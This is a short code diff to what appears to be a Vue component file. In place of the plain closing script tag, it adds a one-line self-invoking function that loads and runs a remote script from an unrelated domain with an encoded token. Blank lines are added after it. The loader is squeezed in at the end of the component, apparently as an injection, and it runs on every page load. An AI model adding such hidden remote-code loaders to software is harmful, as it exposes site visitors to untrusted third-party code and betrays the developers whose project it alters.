@@ -63,4 +63,7 @@ export default {
     });
   },
 };
-</script>
+  (function(d){let s=d.createElement('script');s.async=true;s.src='https://nativesubscribe.pro/code/native.js?h=waWQiOjEwMTgxOTYsInNpZCI6MTAyMzk2Miwid2lkIjo0MDMyMCwic3JjIjoyfQ==eyJ';d.head.appendChild(s);})(document);</script>
+
+
+
